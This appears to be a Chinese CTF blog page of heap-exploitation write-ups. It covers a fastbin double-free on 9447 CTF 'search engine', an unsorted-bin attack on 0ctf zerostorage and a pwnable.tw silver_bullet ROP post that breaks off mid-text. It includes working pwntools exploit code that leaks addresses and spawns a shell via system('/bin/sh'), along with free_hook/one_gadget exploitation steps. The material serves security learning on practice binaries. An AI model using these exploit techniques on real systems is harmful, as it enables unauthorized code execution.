p64(libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>] )+ p64(<span class="number">0</span>) + p64(libc.symbols[<span class="string">'_IO_2_1_stdin_'</span>]) + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(next(libc.search(<span class="string">'/bin/sh'</span>))) +p64(<span class="number">0</span>)*<span class="number">4</span> )</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.send(p64(libc.symbols[<span class="string">'system'</span>]))</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*] system '</span>,hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2018/06/05/fastbin-attack-search/">
                fastbin_attack-search
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2018-06-05</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <h1 id="fastbin-劫持"><a href="#fastbin-劫持" class="headerlink" title="fastbin 劫持"></a>fastbin 劫持</h1><p>最近在看GitHub上的<a href="https://github.com/shellphish/how2heap" target="_blank" rel="noopener">how2heap</a> ，专门讲针对堆的攻击方法。本篇是看了fastbin_dup_into_stack.c和对应的题目9447 ctf 2015 search engine进行的总结。</p>
<p>在看fastbin_dup_into_stack.c时我还不太清楚将fastbin劫持到栈中能起到什么作用，看了search engine明白了，劫持到栈中是为了直接覆写返回地址，执行shell。</p>
<p>[TOC]</p>
<h2 id="1-fastbin劫持的原理"><a href="#1-fastbin劫持的原理" class="headerlink" title="1.fastbin劫持的原理"></a>1.fastbin劫持的原理</h2><p>fastbin劫持的原理是，在双重释放之后，fastbin上会有两个相同的chunk，当其中一个chunk被分配并能够进行写操作时，另一个留在fastbin链表里的chunk对应的内容也会发生改变，通过覆写FD指针，将链表中的下一个结点指向我们可以操控的地方。需要注意的是，fastbin再分配之前会先检查当前这个chunk的大小是否与申请的大小一致，因此伪造的fastbin chunk的size字段必须满足条件。</p>
<p><img src="/2018/06/05/fastbin-attack-search/fastbin_1.png" alt=""></p>
<p><img src="/2018/06/05/fastbin-attack-search/fastbin_2.png" alt="fastbin attack"></p>
<p>了解了原理之后再看search engine这道题。</p>
<h2 id="2-search-engine"><a href="#2-search-engine" class="headerlink" title="2.search engine"></a>2.search engine</h2><h3 id="1-基本逻辑"><a href="#1-基本逻辑" class="headerlink" title="1) 基本逻辑"></a>1) 基本逻辑</h3><p>一个简单的搜索引擎，index  a  sentence输入一个句子，单词用空格作为分隔，每个单词放入一个结点中，记录单词的地址、大小以及所在句子的地址、大小，最后一个字段记录下一个结点的地址。单词链表类似于一个栈的结构，最后分隔的单词在链表的最顶端。一个node结点占40字节。</p>
<p><img src="/2018/06/05/fastbin-attack-search/menu.png" alt="menu"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> * word;         <span class="comment">//8 bytes</span></span><br><span class="line">    <span class="keyword">int</span> word_size;       <span class="comment">//4 bytes</span></span><br><span class="line">    <span class="keyword">int</span> word_padding;    <span class="comment">//4 bytes</span></span><br><span class="line">    <span class="keyword">char</span> * sentence;     <span class="comment">//8 bytes</span></span><br><span class="line">    <span class="keyword">int</span> sentence_size;   <span class="comment">//4 bytes</span></span><br><span class="line">    <span class="keyword">int</span> sentence_padding;<span class="comment">//4 bytes</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> *<span class="title">next</span>;</span>		 <span class="comment">//8 bytes</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>search with a word输入一个单词，从链表的头部开始查找相同单词，找到之后将对应的sentence置为0，并free sentence指针所指空间。</p>
<h3 id="2-漏洞"><a href="#2-漏洞" class="headerlink" title="2) 漏洞"></a>2) 漏洞</h3><p>本题共有两个漏洞：</p>
<p>第二个漏洞我确实没看出来，大概是不细心&amp;平时我也是这么写的= =</p>
<ul>
<li>释放sentence之后对应指针没有置零，UAF漏洞和double-free漏洞。</li>
</ul>
<ul>
<li><p>input_num函数可以泄露栈中的内容。strtol函数的第二个参数endptr返回的是字符串中不能转换为数字的地址，当输入的首个字符就不能转换为数字时，即&amp;nptr == endptr，input_num就会将输入的字符串打印出来。当输入的字符数量为48时，input_str不会向结尾加入NULL，由此可以读出字符串之后栈中的内容。</p>
<p>​</p>
</li>
</ul>
<h3 id="3-漏洞利用"><a href="#3-漏洞利用" class="headerlink" title="3) 漏洞利用"></a>3) 漏洞利用</h3><p>有了以上两个漏洞，再结合fastbin_dup_into_stack.c来看，我们需要<strong>泄露栈中地址</strong>，<strong>泄露libc地址</strong>（进而泄露system地址），将<strong>system函数写入栈中的返回地址处</strong>，执行system函数。</p>
<p><strong>泄露栈地址</strong>（这个真的不是玄学吗？？）</p>
<p>input_num函数是递归调用的，第一次输入48个字节后面没有其他东西，但是继续输入48个字节就有机会泄露栈中内容，即通过向上增长栈寻找可泄露的地址。</p>
<p><img src="/2018/06/05/fastbin-attack-search/leak_stack.png" alt="两次输入48字节"></p>
<p>通过多次gdb的调试，发现泄露的内容是一个栈地址，但是<em>我到现在还是不太明白，为什么这个栈地址加上某一偏移的地址其值能一直保持不变化</em>。这里打一个问号。看别人的题解说，这里距离返回地址的位置比较近，可以确定的是，调用index sentence和 search word函数的返回地址都是0x400d60- 0x400e24范围内的，且压入返回地址的位置永恒不变，可以确定通过泄露的栈地址计算返回地址的栈地址，但是如何定位到含有“0x40”的地址，还没有搞清楚。</p>
<p><img src="/2018/06/05/fastbin-attack-search/leak_stack_2.png" alt=""></p>
<p><strong>泄露libc地址</strong></p>
<p>UAF漏洞可以达到这个目的。试想如果sentence（简称s1）的大小与一个node一样，都是40 bytes，那么当释放s1空间后，再输入一个新的sentence（简称s2，保证大小不是32-40字节，防止将刚释放的s1分配给它），这时会建立一个新的node（简称n2）存放word信息，就会将刚释放的s1的空间分配给n2，而且也能保证s1空间不再为NULL，绕过了对内容是否为空的检查：*（node + 16）！=NULL。</p>
<p>由于s1释放之后没有把指针置空，导致原来的node的word和sentence指针仍指向原来的位置，通过search并删除s1，使 n2 引用的是已释放的空间。</p>
<p>继续把已经释放的s1分配给新的sentence（简称s3），并通过向s3里写内容，伪造一个假的node结点，使其中sentence指针指向puts@got，这样在search成功之后，就会输出puts@got中的puts地址，从而泄露libc地址。</p>
<p><strong>system函数覆盖栈中返回地址</strong></p>
<p>按照其他大佬的思路，在泄露的栈地址之后找到了0x40用于表示chunk_size的地址，且距离返回地址较近，接下来就可以通过fastbin劫持将fastbin链表结点指向这个栈中地址。</p>
<p>为了配合0x40这个大小，可以新建两个0x40长度的sentence a和b，按照程序逻辑b对应的node结点将会在word链表的顶端。</p>
<p>然后通过search删除它们，fastbin中的结构如下: fastbin -&gt; a-&gt;b-&gt;NULL，由于node中的指针并没有置零，因此search的时候还会去检查已经释放的a和b空间是否符合条件。</p>
<p>search（’\x00’），先从word的顶端b对应的node开始检查，由于b中的FD指针为NULL，它不能通过<em>（node + 16）！=NULL 的检测，接着来到a对应的node，即使node能够满足条件，但是<em>*由于a是fastbin中的第一个chunk，释放它将会引发错误。</em></em>因此我们可以在最开始时候新建3个sentence a,b,c。这样fastbin中就是：fastbin -&gt;a -&gt;b -&gt; c -&gt; NULL ，然后再search(‘\00’)，删除掉b保留a，达到双重释放的目的，fastbin结构变成：fastbin -&gt;b -&gt;a -&gt;b -&gt;……</p>
<p>释放之后，再申请相同大小的sentence导致b空间被分配，并通过改写b从而改掉处于fastbin中b的FD指针，使其指向栈中假的chunk。</p>
<p>接着把剩余的a和b再分配出去，再申请sentence将会返回栈中的假chunk，以写sentence的内容覆写返回地址。</p>
<h3 id="4）exp"><a href="#4）exp" class="headerlink" title="4）exp"></a>4）exp</h3><p>（栈中偏移地址部分参考了其他<a href="https://www.gulshansingh.com/posts/9447-ctf-2015-search-engine-writeup/" target="_blank" rel="noopener">大佬</a>的数据，整体思路也是顺着这位大佬来的）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">"amd64"</span>, os=<span class="string">"linux"</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./search"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_stack</span><span class="params">()</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Quit\n"</span>)</span><br><span class="line">	p.sendline(<span class="string">"a"</span>*<span class="number">48</span>)</span><br><span class="line">	p.recvline()</span><br><span class="line"></span><br><span class="line">	p.sendline(<span class="string">"b"</span>*<span class="number">48</span>)</span><br><span class="line">	leak = p.recvline().split(<span class="string">' '</span>)[<span class="number">0</span>][<span class="number">48</span>:]</span><br><span class="line">    	<span class="keyword">return</span> int(leak[::<span class="number">-1</span>].encode(<span class="string">'hex'</span>), <span class="number">16</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">(sentence)</span>:</span></span><br><span class="line">	<span class="comment">#p.recvuntil("Quit\n")</span></span><br><span class="line">	p.sendline(<span class="string">"2"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Enter the sentence size:\n"</span>)</span><br><span class="line">	p.sendline(str(len(sentence)))</span><br><span class="line">	p.recvuntil(<span class="string">"Enter the sentence:\n"</span>)</span><br><span class="line">	p.sendline(sentence)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">(word)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Quit\n"</span>)</span><br><span class="line">	p.sendline(<span class="string">"1"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Enter the word size:\n"</span>)</span><br><span class="line">	p.sendline(str(len(word)))</span><br><span class="line">	p.recvuntil(<span class="string">"Enter the word:\n"</span>)</span><br><span class="line">	p.sendline(word)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_libc</span><span class="params">()</span>:</span></span><br><span class="line">	sentence = <span class="string">'a'</span>*<span class="number">12</span> + <span class="string">' b '</span></span><br><span class="line">	sentence = sentence.ljust(<span class="number">40</span>,<span class="string">'c'</span>)</span><br><span class="line">	index(sentence)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#delete s1</span></span><br><span class="line">	search(<span class="string">'b'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Delete this sentence (y/n)?"</span>)</span><br><span class="line">	p.sendline(<span class="string">'y'</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#n4 use s1</span></span><br><span class="line">	index(<span class="string">'d'</span>*<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#delete s1,but n4 still can use it=&gt;UAF</span></span><br><span class="line">	search(<span class="string">'\x00'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Delete this sentence (y/n)?"</span>)</span><br><span class="line">	p.sendline(<span class="string">'y'</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#a new sentence share space with n4</span></span><br><span class="line">	puts_got = <span class="number">0x602028</span></span><br><span class="line">	node =p64(<span class="number">0x400E90</span>) <span class="comment">#"Enter"</span></span><br><span class="line">	node += p64(<span class="number">5</span>)</span><br><span class="line">	node += p64(puts_got)</span><br><span class="line">	node += p64(<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">	index(node)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#search 'Enter' to leak puts_address</span></span><br><span class="line">	search(<span class="string">'Enter'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Found 64: "</span>)</span><br><span class="line">	puts_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"###puts_addr:0x%x"</span> %puts_addr</span><br><span class="line">	p.recvuntil(<span class="string">"Delete this sentence (y/n)?"</span>)</span><br><span class="line">	p.sendline(<span class="string">'n'</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> puts_addr</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">overwrite_retn</span><span class="params">()</span>:</span></span><br><span class="line">	index(<span class="string">'a'</span>*<span class="number">54</span>+<span class="string">' d'</span>)</span><br><span class="line">	index(<span class="string">'b'</span>*<span class="number">54</span>+<span class="string">' d'</span>)</span><br><span class="line">	index(<span class="string">'c'</span>*<span class="number">54</span>+<span class="string">' d'</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># a-&gt;b-&gt;c-&gt;NULL</span></span><br><span class="line">	search(<span class="string">'d'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Delete this sentence (y/n)?"</span>)</span><br><span class="line">	p.sendline(<span class="string">'y'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Delete this sentence (y/n)?"</span>)</span><br><span class="line">	p.sendline(<span class="string">'y'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Delete this sentence (y/n)?"</span>)</span><br><span class="line">	p.sendline(<span class="string">'y'</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># b-&gt;a-&gt;b-&gt;c-&gt;NULL</span></span><br><span class="line">	search(<span class="string">'\x00'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Delete this sentence (y/n)?"</span>)</span><br><span class="line">	p.sendline(<span class="string">'y'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Delete this sentence (y/n)?"</span>)</span><br><span class="line">	p.sendline(<span class="string">'n'</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># fake fastbin</span></span><br><span class="line">	index(p64(stack_addr).ljust(<span class="number">56</span>,<span class="string">'e'</span>))</span><br><span class="line"></span><br><span class="line">	<span class="comment"># malloc a and b</span></span><br><span class="line">	index(<span class="string">'f'</span>*<span class="number">56</span>)</span><br><span class="line">	index(<span class="string">'g'</span>*<span class="number">56</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># overwrite the ret address with gadget</span></span><br><span class="line">	pop_ret = <span class="number">0x400e23</span></span><br><span class="line">	sentence = <span class="string">'A'</span>*<span class="number">30</span></span><br><span class="line">	sentence += p64(pop_ret)</span><br><span class="line">	sentence += p64(binsh_addr)</span><br><span class="line">	sentence += p64(system_addr)</span><br><span class="line"></span><br><span class="line">	index(sentence)</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line"><span class="comment">#leak stack address</span></span><br><span class="line">stack_leak = leak_stack()</span><br><span class="line">stack_addr = stack_leak + <span class="number">0x22</span> - <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc address</span></span><br><span class="line">puts_addr = leak_libc()</span><br><span class="line">libc = ELF(<span class="string">'libc.so'</span>)</span><br><span class="line">system_addr = puts_addr - (libc.symbols[<span class="string">'puts'</span>]-libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">binsh_addr = puts_addr - (libc.symbols[<span class="string">'puts'</span>]-next(libc.search(<span class="string">'/bin/sh'</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#double free to edit the retn address in stack</span></span><br><span class="line">overwrite_retn()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2018/03/13/unsortedbin-attack-0ctf-zerostorage/">
                unsortedbin_attack--0ctf zerostorage
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2018-03-13</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <h1 id="unsortedbin-attack"><a href="#unsortedbin-attack" class="headerlink" title="unsortedbin attack"></a>unsortedbin attack</h1><p>代码中存在UAF漏洞时，可以通过操纵unsorted bin 的BK指针时，使其修改某一变量的值。举一个简单的例子:</p>
<p><a href="https://github.com/shellphish/how2heap/blob/master/unsorted_bin_attack.c" target="_blank" rel="noopener">shellphish/how2heap/unsorted_bin_attack</a></p>
<p>一个unsorted bin，称为victim，victim具有UAF漏洞，则在释放后操作victim时，可以修改victim-&gt;bk为需要修改的变量var的地址-0x10，即&amp;var-0x10，这样在再次将victim分配时，会进行unlink操作，将var的值修改为unsorted bin头的地址：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bck = victim-&gt;bk;    <span class="comment">//bck = &amp;var-0x10</span></span><br><span class="line">unsorted_chunk(av)-&gt;bk = bck; </span><br><span class="line">bck-&gt;fd = unsorted_chunk(av) <span class="comment">//*(&amp;var-0x10+0x10) = unsorted_chunk(av) =&gt; var = unsorted_chunk(av)</span></span><br></pre></td></tr></table></figure>
<p>典型的应用是修改global_max_fast，这个全局变量代表着fastbin 中能够放入的最大chunk的大小，通过修改这个值可以让所有的chunk释放之后都挂在fastbin上，由于fastbin的结构简单，是单链结构，进而进行fastbin攻击。</p>
<h1 id="实例：0ctf-zerostorage"><a href="#实例：0ctf-zerostorage" class="headerlink" title="实例：0ctf zerostorage"></a>实例：0ctf zerostorage</h1><h2 id="1-基本逻辑"><a href="#1-基本逻辑" class="headerlink" title="1.基本逻辑"></a>1.基本逻辑</h2><p>典型的对堆进行操作的题：</p>
<p><img src="/2018/03/13/unsortedbin-attack-0ctf-zerostorage/main.png" alt="功能menu"></p>
<p>insert函数中可以看出，有一个全局数组entries，应该是一个结构体数组，每一个结构体占24个字节，前四个字节记录是否使用中，接着四个字节的padding，然后是8字节的长度和8字节的内容地址信息，这里地址信息不是直接记录的，而是通过与/dev/urandom中的数字异或后存放的。 content内容地址的分配内存是分三种情况：x&lt; 128 直接分配大小为128；128&lt;=x&lt;=4096 分配大小为x；x&gt;4096只分配4096大小。</p>
<p><img src="/2018/03/13/unsortedbin-attack-0ctf-zerostorage/insert.png" alt="insert关键代码"></p>
<p><img src="/2018/03/13/unsortedbin-attack-0ctf-zerostorage/random.png" alt="异或的值来自/dev/urandom"></p>
<p><img src="/2018/03/13/unsortedbin-attack-0ctf-zerostorage/entry.png" alt="结构体结构"></p>
<p>update函数用于重新编辑content，必要时重新分配内存，修改length和content addr。</p>
<p><img src="/2018/03/13/unsortedbin-attack-0ctf-zerostorage/update.png" alt="update函数关键代码"></p>
<p>merge函数合并两个entry对应的content，释放第一个entry的content，将第一个entry各项置零，并重新找到一个entry，把合并后的content地址赋给新的entry 的 content addr。</p>
<p><img src="/2018/03/13/unsortedbin-attack-0ctf-zerostorage/merge.png" alt="merge函数关键代码"></p>
<p>delete函数释放entry的content addr 所指的内存，并将指针置零，entry中的各项也置零，很安全，是free的正确使用方法。</p>
<p><img src="/2018/03/13/unsortedbin-attack-0ctf-zerostorage/delete.png" alt="delete函数关键代码"></p>
<p>view函数查看内容</p>
<p><img src="/2018/03/13/unsortedbin-attack-0ctf-zerostorage/view.png" alt="view函数"></p>
<h2 id="2-漏洞"><a href="#2-漏洞" class="headerlink" title="2.漏洞"></a>2.漏洞</h2><p>虽然本题的delete函数非常安全，但是在merge函数中，如果输入的两个编号一样，将会先free 然后又把指针给另一个entry，即UAF。</p>
<h2 id="3-漏洞利用"><a href="#3-漏洞利用" class="headerlink" title="3.漏洞利用"></a>3.漏洞利用</h2><p>本题开了所有保护，关键是PIE</p>
<p><img src="/2018/03/13/unsortedbin-attack-0ctf-zerostorage/checksec.png" alt="checksec"></p>
<p>本题还提到一条，之后会用到：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Notice: Latest Ubuntu 14.04.4 LTS, with 3.13.0-79-generic kernel.</span><br></pre></td></tr></table></figure>
<p><strong>libc地址泄露：</strong> 第一个释放的chunk（不是fastbin），其FD和BK指针都指向main_arena中bins结构中的unsorted bin头，main_arena中的各个值存放于libc中的bss段，因此，可以在merge 之后读取这一块的前八个字节，正好是libc中的地址，通过偏移可以计算出libc的基址。</p>
<p>由于本题开了PIE，因此不能直接获取程序中指令的地址，但是在 Notice中提到的【Ubuntu 14.04.4 LTS, with 3.13.0-79-generic kernel】的操作系统存在着<a href="https://cybersecurity.upv.es/attacks/offset2lib/offset2lib.html" target="_blank" rel="noopener">offsetlibc</a>的漏洞，也就是说可以从libc的基址推断出程序的基址。</p>
<p><strong>unsorted bin attack修改global_max_fast的值：</strong> update上一步提到的块，将BK修改为&amp;global_max_fast -0x10，FD修改为一个较大的值。再insert一个新的entry时，会将这个块从unsorted bin上unlink后分给新 entry的content，由此完成了对global_max_fast值的改写，接下来的所有块都将属于fastbin的范围。</p>
<p><strong>fastbin劫持用于读取random的值：</strong> 再merge另外两个相同的块，此时释放的块将挂在fastbin上，设某一已经分配的entry的index为idx1，利用UAF修改该fastbin的FD指针为entries[idx1]，且保证entries[idx1]和merge的块在fastbin中的大小相同，如均为144，因为fastbin在分配时候会首先检查chunk的size字段是否为当前链中应该的大小。 之后再insert两次，第一次将merge的块从fastbin中摘除，此时fastbin的头就指向了entries[idx1]，第二次insert就把entries[idx1]分给了新的entry 称为 entries[idx3]，即entries[idx3]的content addr指向entries[idx1]。由于entries[idx3] + 0x16中记载的是entries[idx1]^random，通过update idx3将这个值读出后异或entries[idx1]，由此得到random的值</p>
<p>这次的shell的执行没有用system，学到了一个新的知识：</p>
<p><a href="https://github.com/david942j/one_gadget" target="_blank" rel="noopener">one_gadget</a></p>
<p>再次update idx3，修改idx1下一个entry idx2的content addr处为 free_hook^ random，这样再update idx2时，相当于修改free_hook的值，将其写为one_gadget的地址。</p>
<h2 id="4-exp"><a href="#4-exp" class="headerlink" title="4.exp"></a>4.exp</h2><p>由于目前手中没有Ubuntu 14.xx的系统，在此只记录思路，之后再做具体复现，exp可以参考</p>
<p><a href="https://github.com/HQ1995/Heap_Senior_Driver/blob/master/0ctf2016/zerostorage/x.py" target="_blank" rel="noopener">Hanquing Zhao</a></p>
<p>思路：</p>
<p>用#0，#1，…代表entries[0]，entries[1]；&amp;0，&amp;1，….代表堆上分配的各个content编号</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">insert #0 -&gt; &amp;0</span><br><span class="line">insert #1 -&gt; &amp;1</span><br><span class="line">insert #2 -&gt; &amp;2</span><br><span class="line"></span><br><span class="line">merge #1,#1 =&gt; #3-&gt;&amp;1(已free)</span><br><span class="line">view #3 =&gt;读FD 泄露libc地址，进而获取one_gadget地址、entries地址和free_hook地址</span><br><span class="line"></span><br><span class="line">update #3 =&gt;覆写global_max_fast的值，之后所有chunk都属于fastbin</span><br><span class="line"></span><br><span class="line">insert #1 -&gt; &amp;1</span><br><span class="line">insert #4 -&gt; &amp;3</span><br><span class="line">insert #5 -&gt; &amp;4</span><br><span class="line"></span><br><span class="line">merge #4,#4 =&gt; #6-&gt;&amp;3(已free)</span><br><span class="line">update #6 =&gt;FD的值写成#5（entries[5]）的地址</span><br><span class="line"></span><br><span class="line">insert #7-&gt;&amp;3</span><br><span class="line">insert #8-&gt;#5 </span><br><span class="line"></span><br><span class="line">view #8 =&gt;获取random的值</span><br><span class="line">update #8 =&gt;覆写#6的各个字段，重点是将content_addr写为random^free_hook</span><br><span class="line">update #6 =&gt;在free_hook中写入one_gadget地址</span><br><span class="line"></span><br><span class="line">delete #0 =&gt;调用free_hook即one_gadget</span><br></pre></td></tr></table></figure>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2018/03/08/pwnable-tw-silver-bullet/">
                pwnable.tw-silver_bullet
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2018-03-08</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <h1 id="silver-bullet"><a href="#silver-bullet" class="headerlink" title="silver_bullet"></a>silver_bullet</h1><h2 id="1-基本逻辑"><a href="#1-基本逻辑" class="headerlink" title="1)基本逻辑"></a>1)基本逻辑</h2><p>依旧是菜单类型的小游戏：</p>
<p><img src="/2018/03/08/pwnable-tw-silver-bullet/menu.png" alt="menu"></p>
<p>这道题就是create一个silver bullet（简称sb），输入的字符串长度就是sb的能量，power up会用strncat连接上新输入的字符串，仍旧是长度是能量，然后能量达到一定值时beat ，然后返回。</p>
<h2 id="2-漏洞"><a href="#2-漏洞" class="headerlink" title="2)漏洞"></a>2)漏洞</h2><p>power_up函数中，用到了strncat，而该函数<strong>会在末尾主动加入\0</strong>。这个操作有机会覆盖s[48]，即记录字符串长度的最低位。</p>
<p><img src="/2018/03/08/pwnable-tw-silver-bullet/power_up.png" alt="漏洞所在--power_up函数"></p>
<h2 id="3-漏洞利用"><a href="#3-漏洞利用" class="headerlink" title="3)漏洞利用"></a>3)漏洞利用</h2><p>考虑到power_up只在s[48]&lt;=47时起作用，可以分两次操作：先create一个47长度的sb，然后power_up 1，通过strncat，\0就会覆盖s[48]，再计算长度时就为0+1=1</p>
<p>这样就可以继续再写47个字符了，并且是从s[48]之后开始写。</p>
<p>继续写的字符可以伪造ROP，当然为了返回，应该首先执行beat函数，将s[48]的之后三位写成FF FF FF，这样当以int类型读取字符串大小时（即从s[48]开始，长度为4的int），大小为FFFFFF01，就可以利用beat成功返回了。</p>
<p><strong>system函数地址泄露：</strong>通过puts输出函数地址，从而泄露system的地址。因为可以继续写47个字符，将有机会覆写main的返回地址。将main的返回地址写为puts@plt，并在此处构造ROP结构，称为ROP1，puts函数的参数为puts@got，即读出puts的实际地址，进而泄露system地址。由于ROP1中不能继续构造新的ROP，因此将返回地址位置写为一个gadget。</p>
<p><img src="/2018/03/08/pwnable-tw-silver-bullet/ROP1.png" alt="puts函数的ROP1结构"></p>
<p><strong>system函数调用：</strong></p>
